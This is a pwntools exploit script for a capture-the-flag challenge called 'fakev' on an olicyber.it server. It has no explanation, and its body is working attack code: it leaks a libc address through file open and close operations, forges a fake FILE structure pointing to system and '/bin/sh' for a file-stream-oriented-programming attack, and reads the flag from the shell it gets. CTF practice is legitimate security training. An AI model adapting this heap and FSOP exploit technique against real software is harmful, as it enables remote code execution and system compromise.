from pwn import *

exe = ELF("./fakev_patched", checksec=True)
libc = ELF("./libc.so.6", checksec=False)

context.binary = exe

HOST = "fakev.challs.olicyber.it"
PORT = 11004

gdbscript = """
set follow-fork-mode child
"""

args.LOCAL = True
args.DEBUG = True

def conn():
    if args.LOCAL:
        r = process(exe.path)
        if args.DEBUG:
            gdb.attach(r, gdbscript=gdbscript)
    else:
        r = remote(HOST, PORT)

    return r

def close_file(r):
    r.sendlineafter(b"Choice: ", b"4")

def open_file(r, idx):
    r.sendlineafter(b"Choice: ", b"1")
    r.sendlineafter(b"Index: ", str(idx).encode())

def read_file(r, idx):
    r.sendlineafter(b"Choice: ", b"2")
    r.sendlineafter(b"Index: ", str(idx).encode())
    
def leak_libc(r):
    for i in range(1, 9):
        open_file(r, i)

    for i in range(8):
        close_file(r)
    
    read_file(r, 1)

    leak = int.from_bytes(r.recvline()[8:18], "little")
    libc.address = leak - 0x3ebca0
    log.success(f"LEAKED LIBC: {hex(libc.address)}")

def get_fake_file():
    binsh = next(libc.search(b"/bin/sh\x00"))
    
    fake_file = pack(0x2000)
    fake_file += pack(0) * 4
    fake_file += (pack((binsh - 100) // 2) + pack(0) * 2) * 2
    fake_file += pack(0) * 4
    fake_file += pack(-1)
    fake_file += pack(0)
    fake_file += pack(0x602110)
    
    fake_file += pack(-1)
    fake_file += pack(0)
    fake_file += pack(0x602108)
    fake_file += pack(0) * 6
    fake_file += pack(libc.address + 0x3e7e70)
    fake_file += pack(libc.symbols.system)
    
    return fake_file

def fsop(r):
    for idx in range(1, 10):
        open_file(r, idx)

    payload = pack(0x34) + get_fake_file()
    payload = payload.ljust(0x100, b"\x00")
    
    r.send(payload)
    
def main():
    r  = conn()

    leak_libc(r)
    fsop(r)

    r.sendline(b"cat flag.txt")
    r.interactive()

if __name__ == "__main__":
    main()
